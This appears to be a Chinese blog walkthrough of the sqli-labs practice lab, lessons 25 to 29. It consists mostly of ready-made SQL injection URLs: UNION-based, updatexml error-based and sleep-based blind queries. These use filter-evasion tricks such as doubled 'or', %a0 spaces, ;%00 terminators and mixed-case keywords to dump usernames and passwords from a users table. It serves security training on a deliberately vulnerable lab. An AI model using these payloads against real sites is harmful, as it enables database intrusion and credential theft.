
# Sqli-labs-Less-25  方法一
![](https://img-blog.csdnimg.cn/20200723110937559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=o31tT&originHeight=353&originWidth=1148&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**首先我们输入?id=1'**<br />http://169.254.4.80/sql/Less-25/?id=1'<br />报错<br />![](https://img-blog.csdnimg.cn/20200721161639175.png#crop=0&crop=0&crop=1&crop=1&id=LCHnm&originHeight=186&originWidth=1208&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**将?id=1' 进行注释，登录成功**<br />?id=1' --+<br />![](https://img-blog.csdnimg.cn/20200721161721251.png#crop=0&crop=0&crop=1&crop=1&id=mdAYz&originHeight=138&originWidth=425&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**使用order by查询有多少列**<br />http://169.254.4.80/sql/Less-25/?id=1' order by 3--+<br />发生报错，看下面的提醒，显示order by 不完整，说明将or进行了替换<br />![](https://img-blog.csdnimg.cn/2020072116183145.png#crop=0&crop=0&crop=1&crop=1&id=t3zhJ&originHeight=40&originWidth=557&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**双写or，登陆成功，说明有三列**<br />http://169.254.4.80/sql/Less-25/?id=1' oorrder by 3--+<br />![](https://img-blog.csdnimg.cn/20200721162006115.png#crop=0&crop=0&crop=1&crop=1&id=bVN7d&originHeight=162&originWidth=425&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前库**<br />http://169.254.4.80/sql/Less-25/?id=-1' union select 1,2,database()--+<br />![](https://img-blog.csdnimg.cn/20200721162122383.png#crop=0&crop=0&crop=1&crop=1&id=Zljsb&originHeight=150&originWidth=484&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有库**<br />http://169.254.4.80/sql/Less-25/?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+<br />报错查看提示information不完整<br />![](https://img-blog.csdnimg.cn/20200721162241813.png#crop=0&crop=0&crop=1&crop=1&id=dY1YX&originHeight=39&originWidth=1201&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**将information中的or双写，成功**<br />http://169.254.4.80/sql/Less-25/?id=-1' union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata--+<br />![](https://img-blog.csdnimg.cn/20200721162334208.png#crop=0&crop=0&crop=1&crop=1&id=kwfca&originHeight=175&originWidth=1041&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有表（security）**<br />http://169.254.4.80/sql/Less-25/?id=-1' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'--+<br />![](https://img-blog.csdnimg.cn/20200721162440950.png#crop=0&crop=0&crop=1&crop=1&id=otPGR&originHeight=165&originWidth=524&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有字段（users）**<br />http://169.254.4.80/sql/Less-25/?id=-1' union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name='users'--+<br />![](https://img-blog.csdnimg.cn/2020072116253295.png#crop=0&crop=0&crop=1&crop=1&id=O41Ur&originHeight=138&originWidth=450&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有账户和密码**<br />http://169.254.4.80/sql/Less-25/?id=-1' union select 1,2,group_concat(concat_ws('~',username,password)) from security.users--+<br />报错，查看提示显示password不完整<br />![](https://img-blog.csdnimg.cn/20200721162710237.png#crop=0&crop=0&crop=1&crop=1&id=pyheU&originHeight=43&originWidth=1211&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**将password中的or双写**<br />http://169.254.4.80/sql/Less-25/?id=-1' union select 1,2,group_concat(concat_ws('~',username,passwoorrd)) from security.users--+<br />![](https://img-blog.csdnimg.cn/20200721162813302.png#crop=0&crop=0&crop=1&crop=1&id=o5ioR&originHeight=198&originWidth=1373&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


---


# Sqli-labs-Less-25  方法二
**使用报错注入**<br />**查看当前数据库**<br />http://169.254.4.80/sql/Less-25/?id=1' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '1'='1<br />报错，查看提示or被清除掉了<br />![](https://img-blog.csdnimg.cn/20200721163323733.png#crop=0&crop=0&crop=1&crop=1&id=Nnhm3&originHeight=36&originWidth=1004&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**在这里我们不将or进行双写，而是将or改为||**<br />http://169.254.4.80/sql/Less-25/?id=1' || updatexml(1,concat(0x7e,(select database()),0x7e),1) || '1'='1<br />成功爆出<br />![](https://img-blog.csdnimg.cn/2020072116343124.png#crop=0&crop=0&crop=1&crop=1&id=PsfFD&originHeight=180&originWidth=1097&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有数据库（注意将information中的or双写）**<br />http://169.254.4.80/sql/Less-25/?id=1' || updatexml(1,concat(0x7e,(select group_concat(schema_name) from infoorrmation_schema.schemata),0x7e),1) || '1'='1<br />![](https://img-blog.csdnimg.cn/2020072116361855.png#crop=0&crop=0&crop=1&crop=1&id=zfqWD&originHeight=174&originWidth=1099&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有表（security）**<br />http://169.254.4.80/sql/Less-25/?id=1' || updatexml(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'),0x7e),1) || '1'='1<br />![](https://img-blog.csdnimg.cn/20200721163755450.png#crop=0&crop=0&crop=1&crop=1&id=LWsrD&originHeight=167&originWidth=1108&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有字段**<br />http://169.254.4.80/sql/Less-25/?id=1' || updatexml(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_name='users'),0x7e),1) || '1'='1<br />![](https://img-blog.csdnimg.cn/20200721164630241.png#crop=0&crop=0&crop=1&crop=1&id=FTZ7N&originHeight=186&originWidth=1098&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有账户和密码（将password中的or双写）**<br />http://169.254.4.80/sql/Less-25/?id=1' || updatexml(1,concat(0x7e,(select group_concat(concat_ws('~',username,passwoorrd)) from security.users),0x7e),1) || '1'='1<br />![](https://img-blog.csdnimg.cn/20200721164717320.png#crop=0&crop=0&crop=1&crop=1&id=ijQFu&originHeight=192&originWidth=1114&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**以此类推爆出所有数据。**


# Sqli-labs-Less-26
![](https://img-blog.csdnimg.cn/20200723111031546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=onnAq&originHeight=347&originWidth=1088&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**TIPS:本关可能有的朋友在 windows 下无法使用一些特殊的字符代替空格，此处是因为 apache 的解析的问题，这里请更换到 linux 平台下**

**判断注入点**<br />http://www.web.com/sql/Less-26/?id=1'<br />报错<br />![](https://img-blog.csdnimg.cn/20200722193824392.png#crop=0&crop=0&crop=1&crop=1&id=HVnSj&originHeight=33&originWidth=1537&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
http://www.web.com/sql/Less-26/?id=1'--+<br />还是报错，提示显示--+被注释掉了，这里使用;%00<br />http://www.web.com/sql/Less-26/?id=1';%00<br />成功<br />![](https://img-blog.csdnimg.cn/20200722152753521.png#crop=0&crop=0&crop=1&crop=1&id=aAim0&originHeight=155&originWidth=439&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断列数**<br />http://www.web.com/sql/Less-26/?id=1'order by 3;%00<br />报错<br />![](https://img-blog.csdnimg.cn/20200722194055325.png#crop=0&crop=0&crop=1&crop=1&id=YA6ES&originHeight=29&originWidth=1485&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**提示显示空格和or都被注释掉了，在这里空格使用%a0，将or双写就ok**<br />![](https://img-blog.csdnimg.cn/20200722160522625.png#crop=0&crop=0&crop=1&crop=1&id=HJ2IJ&originHeight=60&originWidth=590&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
http://www.web.com/sql/Less-26/?id=1'%a0oorrder%a0by%a03;%00<br />![](https://img-blog.csdnimg.cn/20200722153532216.png#crop=0&crop=0&crop=1&crop=1&id=hjEou&originHeight=163&originWidth=432&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前数据库**<br />http://www.web.com/sql/Less-26/?id=-1'%a0union%a0select%a01,2,database();%00<br />没有反应，查看提示这是因为-被注释掉了，将?id=-1改为?id=1111或其他不存在的值<br />![](https://img-blog.csdnimg.cn/20200722194829234.png#crop=0&crop=0&crop=1&crop=1&id=WgX8H&originHeight=44&originWidth=948&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
http://www.web.com/sql/Less-26/?id=1111'%a0union%a0select%a01,2,database();%00<br />![](https://img-blog.csdnimg.cn/20200722194810734.png#crop=0&crop=0&crop=1&crop=1&id=HPSIo&originHeight=181&originWidth=531&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**以下步骤与Sqli-labs-Less-25 中方法一相同**<br />注意将空格换为%a0和or进行双写

**也可使用报错注入的方式**<br />将or换为||<br />**查看当前库**<br />http://www.web.com/sql/Less-26/?id=1'%a0||%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0||%a0'1'='1<br />![](https://img-blog.csdnimg.cn/20200722200913871.png#crop=0&crop=0&crop=1&crop=1&id=PExlD&originHeight=36&originWidth=332&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有库**<br />http://www.web.com/sql/Less-26//?id=1'  || updatexml(1, concat(0x7e, (select%a0group_concat(schema_name)%a0from%a0infoorrmation_schema.schemata) ,0x7e),1)  || '1'='1<br />![](https://img-blog.csdnimg.cn/20200722201952859.png#crop=0&crop=0&crop=1&crop=1&id=N436P&originHeight=31&originWidth=564&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有表（security）**<br />http://www.web.com/sql/Less-26//?id=1'  || updatexml(1, concat(0x7e, (select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema='security') ,0x7e),1)  || '1'='1<br />![](https://img-blog.csdnimg.cn/20200722201618679.png#crop=0&crop=0&crop=1&crop=1&id=gZ1gq&originHeight=36&originWidth=567&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看表中字段（users）**<br />http://www.web.com/sql/Less-26//?id=1'  || updatexml(1, concat(0x7e, (select%a0group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name='users') ,0x7e),1)  || '1'='1<br />![](https://img-blog.csdnimg.cn/20200722201825421.png#crop=0&crop=0&crop=1&crop=1&id=VCJwN&originHeight=38&originWidth=483&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看账户和密码**<br />http://www.web.com/sql/Less-26//?id=1'  || updatexml(1, concat(0x7e, (select%a0group_concat(concat('~',username,passwoorrd))%a0from%a0security.users) ,0x7e),1)  || '1'='1<br />![](https://img-blog.csdnimg.cn/20200722202112762.png#crop=0&crop=0&crop=1&crop=1&id=PXVtV&originHeight=36&originWidth=594&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**以此类推爆出所有数据。**


# Sqli-labs-Less-26a
![](https://img-blog.csdnimg.cn/20200723111121924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=V1Jjb&originHeight=356&originWidth=1192&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查找注入点**<br />http://www.web.com/sql/Less-26a/?id=1'<br />没有回显<br />![](https://img-blog.csdnimg.cn/20200722203151714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=zokt8&originHeight=226&originWidth=573&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
http://www.web.com/sql/Less-26a/?id=1'--+<br />通过提示可以看到--+被注释掉了<br />![](https://img-blog.csdnimg.cn/20200722203210869.png#crop=0&crop=0&crop=1&crop=1&id=C6KXU&originHeight=61&originWidth=602&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
http://www.web.com/sql/Less-26a/?id=1';%00<br />还是没有回显<br />![](https://img-blog.csdnimg.cn/20200722203225611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=u3UjJ&originHeight=258&originWidth=592&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
http://www.web.com/sql/Less-26a/?id=1'）<br />依然没有数据回显<br />![](https://img-blog.csdnimg.cn/20200722203225611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Sf7YP&originHeight=258&originWidth=592&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
http://www.web.com/sql/Less-26a/?id=1');%00<br />有数据回显说明存在注入<br />![](https://img-blog.csdnimg.cn/20200722203239776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=wzkQa&originHeight=261&originWidth=527&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**以下步骤于Sqli-labs-Less-25相同**<br />需要注意的是在Sqli-labs-Less-26a中是?id=')在Sqli-labs-Less-25中是?id='<br />**并且注意将空格换为%a0和or进行双写**<br />而且在Sqli-labs-Less-26a中不能像Sqli-labs-Less-26使用报错注入，因为没有回显错误数据。


# Sqli-labs-Less-27![](https://img-blog.csdnimg.cn/20200723111205561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=bWBqG&originHeight=354&originWidth=1078&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**查找注入点**<br />http://www.web.com/sql/Less-27/?id=1'<br />报错<br />![](https://img-blog.csdnimg.cn/20200722205039899.png#crop=0&crop=0&crop=1&crop=1&id=CuhiS&originHeight=146&originWidth=929&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
依然使用;%00进行注释<br />![](https://img-blog.csdnimg.cn/20200722205109464.png#crop=0&crop=0&crop=1&crop=1&id=mcpCI&originHeight=160&originWidth=552&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
成功，存在注入

**判断列数**<br />http://www.web.com/sql/Less-27/?id=1' order by 3;%00<br />出错<br />![](https://img-blog.csdnimg.cn/20200722205255580.png#crop=0&crop=0&crop=1&crop=1&id=lYfDv&originHeight=154&originWidth=938&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**使用%a0代替空格（这里order by正常不用将or双写）**<br />http://www.web.com/sql/Less-27/?id=1'%a0order%a0by%a03;%00<br />成功说明有三列<br />![](https://img-blog.csdnimg.cn/20200722205458367.png#crop=0&crop=0&crop=1&crop=1&id=ksOPV&originHeight=173&originWidth=530&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断当前数据库**<br />http://www.web.com/sql/Less-27/?id=1'%a0union%a0select%a01,2,database();%00<br />出错，提示显示并没有**union select我们尝试将union select大小写混合**<br />http://www.web.com/sql/Less-27/?id=1111'%a0uNion%a0selEct%a01,2,database();%00<br />![](https://img-blog.csdnimg.cn/2020072220594918.png#crop=0&crop=0&crop=1&crop=1&id=iqFoj&originHeight=177&originWidth=534&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有数据库**<br />http://www.web.com/sql/Less-27/?id=1111'%a0uNion%a0selEct%a01,2,group_concat(schema_name)%a0from%a0information_schema.schemata;%00<br />![](https://img-blog.csdnimg.cn/20200722210518426.png#crop=0&crop=0&crop=1&crop=1&id=UmXAb&originHeight=181&originWidth=1526&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有表**<br />http://www.web.com/sql/Less-27/?id=1111'%a0uNion%a0selEct%a01,2,group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='security';%00<br />![](https://img-blog.csdnimg.cn/20200722210844294.png#crop=0&crop=0&crop=1&crop=1&id=cWd4s&originHeight=174&originWidth=648&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有字段**<br />http://www.web.com/sql/Less-27/?id=1111'%a0uNion%a0selEct%a01,2,group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name='users';%00<br />![](https://img-blog.csdnimg.cn/2020072221094757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=pQ8DV&originHeight=232&originWidth=1869&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有账户和密码**<br />http://www.web.com/sql/Less-27/?id=1111'%a0uNion%a0selEct%a01,2,group_concat(concat_ws('~',username,password))%a0from%a0security.users;%00<br />![](https://img-blog.csdnimg.cn/20200722211052869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=fZZzH&originHeight=225&originWidth=1877&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**以此类推爆出所有数据。**

这一关也可使用报错注入因为有报错显示<br />参照Sqli-labs-Less-26 下半部分<br />注意Sqli-labs-Less-27中不需要双写or，但是需要union select大小写混合


# Sqli-labs-Less-27a 方法一![](https://img-blog.csdnimg.cn/20200723111249995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=yTFHe&originHeight=348&originWidth=1193&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**判断注入点**<br />http://www.web.com/sql/Less-27a/?id=1'<br />没反应<br />http://www.web.com/sql/Less-27a/?id=1"<br />**没有回显，使用;%00注释**<br />http://www.web.com/sql/Less-27a/?id=1";%00<br />![](https://img-blog.csdnimg.cn/20200722212631775.png#crop=0&crop=0&crop=1&crop=1&id=AAjZ6&originHeight=184&originWidth=512&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
ok证明存在注入点

**查看列数**<br />http://www.web.com/sql/Less-27a/?id=1"%a0order%a0by%a03;%00<br />![](https://img-blog.csdnimg.cn/20200722212947100.png#crop=0&crop=0&crop=1&crop=1&id=JnWl5&originHeight=179&originWidth=556&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
存在三列

**以下步骤与Sqli-labs-Less-27相似，不进行详细叙述**<br />注意：<br />Sqli-labs-Less-27中是?id=1'<br />Sqli-labs-Less-27a中是?id=1"<br />并且Sqli-labs-Less-27a不能使用报错注入，因为没有报错回显，不过可使用时间注入。


# Sqli-labs-Less-27a 方法二
**其中%26%26 代表 &&**

1. http://www.web.com/sql/Less-27a/?id=1"%26%26 if(length(database())=8,1,sleep(5))  %26%26 %0a"1"="1<br />注意：在句子后面不能使用or，因为使用or的情况下，无论如何情况返回都会是真。<br />http://www.web.com/sql/Less-27a/?id=1"%26%26 if(length(database())=8,1,sleep(5))  || %0a"1"="1 这种写法是错误的

2. http://www.web.com/sql/Less-27a/?id=1111" || if(length(database())=8,1,sleep(5))%26%26%0a"1"="1这样写也是可以的


# Sqli-labs-Less-28
![](https://img-blog.csdnimg.cn/20200723111405132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=jfofB&originHeight=360&originWidth=1157&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**查找注入点**<br />http://www.web.com/sql/Less-28/?id=1'<br />报错<br />http://www.web.com/sql/Less-28/?id=1';%00<br />依然报错<br />http://www.web.com/sql/Less-28/?id=1') ;%00<br />成功，说明存在注入点<br />![](https://img-blog.csdnimg.cn/20200723095341605.png#crop=0&crop=0&crop=1&crop=1&id=gHHNH&originHeight=138&originWidth=462&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看列数（使用%a0代替空格）**<br />http://www.web.com/sql/Less-28/?id=1') %a0order%a0by%a03 ;%00<br />斜体样式成功，说明有三列<br />![](https://img-blog.csdnimg.cn/20200723100604597.png#crop=0&crop=0&crop=1&crop=1&id=Jm5ah&originHeight=126&originWidth=439&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前库**<br />http://www.web.com/sql/Less-28/?id=1111') %a0union%a0select%a01,2,database() ;%00<br />![](https://img-blog.csdnimg.cn/20200723100733379.png#crop=0&crop=0&crop=1&crop=1&id=Mtrci&originHeight=141&originWidth=411&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有库**<br />http://www.web.com/sql/Less-28/?id=1111') %a0union%a0select%a01,2,group_concat(schema_name)%a0from%a0information_schema.schemata;%00<br />![](https://img-blog.csdnimg.cn/20200723100849776.png#crop=0&crop=0&crop=1&crop=1&id=XdG17&originHeight=158&originWidth=1226&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有表**<br />http://www.web.com/sql/Less-28/?id=1111') %a0union%a0select%a01,2,group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='security';%00<br />![](https://img-blog.csdnimg.cn/20200723101045347.png#crop=0&crop=0&crop=1&crop=1&id=csj0A&originHeight=146&originWidth=551&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有字段**<br />http://www.web.com/sql/Less-28/?id=1111') %a0union%a0select%a01,2,group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name='users';%00<br />![](https://img-blog.csdnimg.cn/20200723101209660.png#crop=0&crop=0&crop=1&crop=1&id=lzbv2&originHeight=194&originWidth=1353&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看账户和密码**<br />http://www.web.com/sql/Less-28/?id=1111') %a0union%a0select%a01,2,group_concat(concat_ws('~',username,password))%a0from%a0security.users;%00<br />![](https://img-blog.csdnimg.cn/20200723101326118.png#crop=0&crop=0&crop=1&crop=1&id=ik07Z&originHeight=181&originWidth=1349&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**以此类推爆出所有数据。**

也可以使用时间盲注<br />1.http://www.web.com/sql/Less-28/?id=1')  %a0   %26%26 if( length(database())>1, 1, sleep(5)    ) ;%00<br />2.http://www.web.com/sql/Less-28/?id=1')  %a0   %26%26 if( length(database())>1, 1, sleep(5)    )  %26%26  ('1')=(‘1<br />这两种方法都是可行的。


# Sqli-labs-Less-28a
![](https://img-blog.csdnimg.cn/20200723151853792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=gEncf&originHeight=369&originWidth=1195&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**查找注入点**<br />http://www.web.com/sql/Less-28a/?id=1')
报错<br />http://www.web.com/sql/Less-28a/?id=1');%00<br />成功。说明存在注入点<br />![](https://img-blog.csdnimg.cn/20200723102026238.png#crop=0&crop=0&crop=1&crop=1&id=ctH9u&originHeight=153&originWidth=441&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断列数**<br />http://www.web.com/sql/Less-28a/?id=1') order by 3;%00<br />成功，说明存在3列<br />![](https://img-blog.csdnimg.cn/202007231021443.png#crop=0&crop=0&crop=1&crop=1&id=ARl7h&originHeight=140&originWidth=435&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询当前库**<br />http://www.web.com/sql/Less-28a/?id=1111')%a0union%a0select%a01,2,database();%00<br />![](https://img-blog.csdnimg.cn/20200723102839542.png#crop=0&crop=0&crop=1&crop=1&id=rnGZV&originHeight=141&originWidth=445&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有库**<br />http://www.web.com/sql/Less-28a/?id=1111')%a0union%a0select%a01,2,group_concat(schema_name)%a0from%a0information_schema.schemata;%00<br />![](https://img-blog.csdnimg.cn/20200723104222818.png#crop=0&crop=0&crop=1&crop=1&id=FKv6u&originHeight=158&originWidth=1236&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**以下步骤与Sqli-labs-Less-28基本相同不进行详细叙述**

**也可使用时间盲注**<br />1.http://www.web.com/sql/Less-28a/?id=11111') %a0  or  %a0   if( length(database())=8, 1, sleep(5)    ) --+<br />或者是<br />2.http://www.web.com/sql/Less-28a/?id=1‘) %a0  and  %a0   if( length(database())=8, 1, sleep(5)    ) --+<br />此时要确保前面的id值是可以查到的，不能使用一个不存在的id值。


# Sqli-labs-Less-29
![](https://img-blog.csdnimg.cn/2020072311210966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Hyyy5&originHeight=389&originWidth=1148&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**错误做法**<br />**查找注入点**<br />http://www.web.com/sql/Less-29/?id=1'<br />报错<br />http://www.web.com/sql/Less-29/?id=1'--+<br />![](https://img-blog.csdnimg.cn/20200723112214603.png#crop=0&crop=0&crop=1&crop=1&id=VPSWs&originHeight=141&originWidth=430&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**说明存在注入点**

**判断列数**<br />http://www.web.com/sql/Less-29/?id=1' order by 3--+<br />等于3时成功，等于4时失败，说明有3列<br />![](https://img-blog.csdnimg.cn/20200723112304978.png#crop=0&crop=0&crop=1&crop=1&id=d2KbU&originHeight=152&originWidth=433&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**这样做真的是正确的吗？不是的！**<br />**这样做就与Sqli-labs-Less-1没有任何区别**

看第九关的标题

![](https://img-blog.csdnimg.cn/20200723112550510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=YCGq2&originHeight=252&originWidth=848&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**这个网站受到世界上最好的防火墙保护**

直接使用是不正确的，搭建jspstudy也可以不过太麻烦了（ps：小声BB：我也不会，尝试搭建jspstudy花费太多时间，走弯路emm...）

**正确使用29关**<br />**打开第二十九关的文件夹可以发现有一个login.php的文件**<br />![](https://img-blog.csdnimg.cn/20200723152823513.png#crop=0&crop=0&crop=1&crop=1&id=eGXfn&originHeight=130&originWidth=334&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
我们只需要在url前面加上login.php即可<br />http://www.web.com/sql/Less-29/login.php

